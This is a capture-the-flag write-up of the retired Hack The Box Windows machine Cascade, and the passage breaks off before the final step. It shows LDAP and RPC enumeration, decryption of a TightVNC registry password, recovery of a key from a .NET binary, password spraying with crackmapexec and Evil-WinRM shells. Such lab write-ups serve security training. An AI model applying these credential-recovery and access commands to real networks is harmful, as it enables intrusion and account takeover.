---
title: HTB: Cascade
url: https://0xdf.gitlab.io/2020/07/25/htb-cascade.html
date: 2020-07-25T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, htb-cascade, ctf, nmap, rpc, ldap, ldapsearch, smb, tightvnc, vncpwd, evil-winrm, crackmapexec, sqlite, dnspy, debug, ad-recycle, oscp-plus-v2, oscp-like-v3
---

![cascade](https://0xdfimages.gitlab.io/img/cascade-cover.png)

Cascade was an interesting Windows all about recovering credentials from Windows enumeration. I’ll find credentials for an account in LDAP results, and use that to gain SMB access, where I find a TightVNC config with a different users password. From there, I get a shell and access to a SQLite database and a program that reads and decrypts a password from it. That password allows access to an account that is a member of the AD Recycle group, which I can use to find a deleted temporary admin account with a password, which still works for the main administrator account, providing a shell.

## Box Info

| Name | [Cascade](https://hackthebox.com/machines/cascade)  [Cascade](https://hackthebox.com/machines/cascade) [Play on HackTheBox](https://hackthebox.com/machines/cascade) |
| --- | --- |
| Release Date | [28 Mar 2020](https://twitter.com/hackthebox_eu/status/1243521890548879360) |
| Retire Date | 25 Jul 2020 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Cascade |
| Radar Graph | Radar chart for Cascade |
| First Blood User | 00:41:43[qtc qtc](https://app.hackthebox.com/users/103578) |
| First Blood Root | 01:05:07[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [VbScrub VbScrub](https://app.hackthebox.com/users/158833) |

## Recon

### nmap

`nmap` shows 15 open TCP ports, typical of a Windows host:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.182
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 06:19 EDT
Nmap scan report for 10.10.10.182
Host is up (0.015s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49172/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
root@kali# nmap -p 53,88,135,389,445,636,3268,3269,5985 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.182
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 06:20 EDT
Nmap scan report for 10.10.10.182
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-29 10:22:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m46s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-29T10:23:00
|_  start_date: 2020-03-29T10:08:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.55 seconds

```

`nmap` identifies the OS as Windows Server 2008 SP1, which is old and no longer supported.

WinRM (TCP 5985) open means that some users will be able to get a shell via creds, so I’ll keep that in mind.

### SMB - TCP 445

SMB seems to allow anonymous login, but then shows no shares:

```

root@kali# smbclient -N -L //10.10.10.182
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
root@kali# smbmap -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: 10.10.10.182

```

### RPC - 445

RPC does allow for anonymous connection as well. I am able to list domain users:

```

root@kali# rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers 
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

```

### LDAP - TCP 389

To enumerate LDAP, first I’ll get the naming context:

```

root@kali# ldapsearch -h 10.10.10.182 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

I can dump all to a file with:

```

ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous

```

If I wanted to get just the people, I could provide a query::

```

ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people

```

Looking through the data, Ryan Thompson has an interesting extra data item at the very end, `cascadeLegacyPwd`:

```

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132299789414187261
lastLogoff: 0
lastLogon: 132299789469255357
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

```

I can decode the value to `rY4n5eva`:

```

root@kali# echo clk0bjVldmE= | base64 -d
rY4n5eva

```

## Shell as s.smith

### Revisiting SMB

I tried connecting over WinRM, but didn’t succeed.

```

root@kali# crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\r.thompson:rY4n5eva "Failed to authenticate the user r.thompson with ntlm"

```

Back to SMB.

#### Validate Creds

With the password collected from LDAP, more shares are visible:

```

root@kali# crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] CASCADE\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

```

`smbmap` shows the same:

```

root@kali# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 

```

#### Share Enumeration

There’s a bunch of files in each of the shares I have access to. I use the following commands to just pull all the files in each share (Data for example):

```

root@kali# smbclient --user r.thompson //10.10.10.182/data rY4n5eva
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (47.4 KiloBytes/sec) (average 47.4 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (20.2 KiloBytes/sec) (average 32.5 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (91.0 KiloBytes/sec) (average 53.4 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (50.3 KiloBytes/sec) (average 52.7 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*

```

Then I can see a nice list of the files with `find`:

```

root@kali# find smb-data-loot/ -type f 
smb-data-loot/IT/Logs/DCs/dcdiag.log
smb-data-loot/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
smb-data-loot/IT/Email Archives/Meeting_Notes_June_2018.html
smb-data-loot/IT/Temp/s.smith/VNC Install.reg

```

There’s a couple interesting files. `Meeting_Notes_June_2018.html` presents like an email when viewed in Firefox:

![image-20200329161051144](https://0xdfimages.gitlab.io/img/image-20200329161051144.png)

I’ll keep an eye out for the admin account password and TempAdmin.

`VNC Install.reg` is interesting too. The file uses 16-bit characters, and therefore looks really ugly in `less` or `vim`, but `cat` handles it:

```

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""

```

The line `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f` jumped out as interesting.

### Crack TightVNC Password

Some reading about TightVNC shows that it stores the password in the register encrypted with a static key. There’s a bunch of tools out there to do it. I used [this](https://github.com/jeroennijhof/vncpwd). It takes a file with the ciphertext, which I created with `echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass`:

```

root@kali# /opt/vncpwd/vncpwd vnc_enc_pass
Password: sT333ve2

```

That command is using the `-r -p` options in `xxd` to convert from a hex string to ran binary.

I could also just use the Bash trick to treat command output as the contents of a file with `<( )`:

```

root@kali# /opt/vncpwd/vncpwd <(echo '6bcf2a4b6e5aca0f' | xxd -r -p)
Password: sT333ve2                       

```

[This link](https://github.com/frizb/PasswordDecrypts) shows how to do it from within Metaspoit, and it works as well:

```

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
=> false
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"

```

### WinRM

With these creds, `crackmapexec` shows that it is possible to get a shell over WinRM:

```

root@kali# crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] CASCADE\s.smith:sT333ve2 (Pwn3d!)

```

I’ll use Evil-WinRM to get a shell:

```

root@kali# evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents>

```

The machine is actually Windows 2008:

```
*Evil-WinRM* PS C:\Users\s.smith\desktop> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
6      1      7601   65536

```

I can also grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\s.smith\desktop> cat user.txt
d1c7e103************************

```

## Privesc: s.smith –> arksvc

### Enumeration

s.smith is a member of the `Audit Share` group:

```
*Evil-WinRM* PS C:\shares\audit> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   3/30/2020 6:40:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

That’s not a standard MS Group, so I’ll check it out:

```
*Evil-WinRM* PS C:\shares\audit> net localgroup "Audit Share"
Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members
-------------------------------------------------------------------------------
s.smith
The command completed successfully.

```

s.smith is the only user in the group, but the comment is a useful hint to look at this share. There’s a `c:\shares\`, but I don’t have permissions to list the directories in it:

```
*Evil-WinRM* PS C:\shares> ls
Access to the path 'C:\shares' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\shares:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

However, I can just go into `Audit` based on the share name in the comment:

```
*Evil-WinRM* PS C:\shares\audit> ls

    Directory: C:\shares\audit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll

```

I can also access this share from my local box:

```

root@kali# crackmapexec smb -u s.smith -p sT333ve2 --shares 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] CASCADE\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares 
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share

```

I’ll copy all the files to my local VM:

```

root@kali# smbclient --user s.smith //10.10.10.182/Audit$ sT333ve2
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> lcd smb-audit-loot/
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (191.2 KiloBytes/sec) (average 191.2 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (206.9 KiloBytes/sec) (average 198.4 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as Audit.db (461.5 KiloBytes/sec) (average 275.3 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.8 KiloBytes/sec) (average 213.2 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (3317.8 KiloBytes/sec) (average 1198.9 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (356.4 KiloBytes/sec) (average 690.9 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (4411.8 KiloBytes/sec) (average 1805.3 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as SQLite.Interop.dll (4629.3 KiloBytes/sec) (average 2308.8 KiloBytes/sec)

```

### Audit.db

The first thing I looked at was `DB\Audit.db`. It’s a SQLite3 database:

```

root@kali# file Audit.db 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002

```

I dumped all the data from the three tables:

```

root@kali# sqlite3 Audit.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc

sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local

sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

sqlite> select * from Misc;

```

Nothing jumped out as particularly interesting. I thought the `Ldap` table could have had a password in it, but the base64-encoded data didn’t decode to ASCII. Perhaps it’s encrypted somehow.

### CascAudit.exe

`RunAudit.bat` shows that `CascAudit.exe` is run with the db file as an argument:

```

root@kali# cat RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"

```

It’s a .NET binary:

```

root@kali# file CascAudit.exe 
CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

I’ll jump over to a Windows VM and use DNSpy to take a look. In the MailModule, there’s this code:

```

namespace CascAudiot
{
  // Token: 0x02000008 RID: 8
  [StandardModule]
  internal sealed class MainModule
  {
    // Token: 0x0600000F RID: 15 RVA: 0x00002128 File Offset: 0x00000328
    [STAThread]
    public static void Main()
    {
      if (MyProject.Application.CommandLineArgs.Count != 1)
      {
        Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
        return;
      }
      checked
      {
        using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
        {
          string str = string.Empty;
          string password = string.Empty;
          string str2 = string.Empty;
          try
          {
            sqliteConnection.Open();
            using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
            {
              using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
              {
                sqliteDataReader.Read();
                str = Conversions.ToString(sqliteDataReader["Uname"]);
                str2 = Conversions.ToString(sqliteDataReader["Domain"]);
                string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
                try
                {
                  password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                  Console.WriteLine("Error decrypting password: " + ex.Message);
                  return;
                }
              }
            }
            sqliteConnection.Close();
          }
          catch (Exception ex2)
          {
            Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
            return;
          }
...[snip]...

```

It is opening an SQLite connection to the database passed as an arg, reading from the LDAP table, and decrypting the password.

I decided to recover the plaintext password by debugging. I put a breakpoint on line 53 where the SQL connection is closed. Then I went Debug -> Start Debugging…, and set the Arugument to where I had a copy of `Audit.db`:

![image-20200330090544403](https://0xdfimages.gitlab.io/img/image-20200330090544403.png)

On hitting OK, it runs to the breakpoint, and I can see the decrypted password in the Locals window:

[![debug](https://0xdfimages.gitlab.io/img/image-20200330090649649.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200330090649649.png)

Based on the line in the SQLite DB, this password, `w3lc0meFr31nd`, likely pairs with the account arksvc.

### WinRM

`crackmapexec` shows that not only does the password work, but will provide a WinRM shell:

```

root@kali# crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] CASCADE\arksvc:w3lc0meFr31nd (Pwn3d!)

```

Had I not know the account that was associated with this password, I could have used `crackmapexec` with a list of users:

```

root@kali# crackmapexec winrm 10.10.10.182 -u users -p w3lc0meFr31nd --continue-on-success
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\CascGuest:w3lc0meFr31nd "Failed to authenticate the user CascGuest with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [+] CASCADE\arksvc:w3lc0meFr31nd (Pwn3d!)
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\s.smith:w3lc0meFr31nd "Failed to authenticate the user s.smith with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\r.thompson:w3lc0meFr31nd "Failed to authenticate the user r.thompson with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\util:w3lc0meFr31nd "Failed to authenticate the user util with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\j.wakefield:w3lc0meFr31nd "Failed to authenticate the user j.wakefield with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\s.hickson:w3lc0meFr31nd "Failed to authenticate the user s.hickson with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\j.goodhand:w3lc0meFr31nd "Failed to authenticate the user j.goodhand with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\a.turnbull:w3lc0meFr31nd "Failed to authenticate the user a.turnbull with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\e.crowe:w3lc0meFr31nd "Failed to authenticate the user e.crowe with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\b.hanson:w3lc0meFr31nd "Failed to authenticate the user b.hanson with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\d.burman:w3lc0meFr31nd "Failed to authenticate the user d.burman with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\BackupSvc:w3lc0meFr31nd "Failed to authenticate the user BackupSvc with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\j.allen:w3lc0meFr31nd "Failed to authenticate the user j.allen with ntlm"
WINRM       10.10.10.182    5985   CASC-DC1         [-] CASCADE\i.croft:w3lc0meFr31nd "Failed to authenticate the user i.croft with ntlm"

```

Anyway, I can get a shell over Evil-WinRM as arksvc:

```

root@kali# evil-winrm -u arksvc -p "w3lc0meFr31nd" -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents>

```

## Privesc: arksvc –> administrator

### Enumeration

arksvc is also in some interesting groups:

```
*Evil-WinRM* PS C:\> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/30/2020 12:37:25 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

### AD Recycle

`AD Recycle Bin` is a well-know Windows group. [Active Directory Object Recovery (or Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files. The linked article gives a PowerShell command to query all of the deleted objects within a domain:

```
*Evil-WinRM* PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local                                                                                   
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine                                                              
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34               
ObjectClass       : container                                                            
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
                                                                                         
Deleted           : True                                                                 
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User                                                                 
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88                             
ObjectClass       : container                                                            
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
                                            
Deleted           : True                                                                 
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local                                                                
Name              : TempAdmin               
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059                                         
ObjectClass       : user                                                                             
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059 

```

The last one is really interesting, because it’s the temporary administer account mentioned in the old email I found earlier (which also said it was using the same password as the normal admin account).

I can get all the details for that account:

```
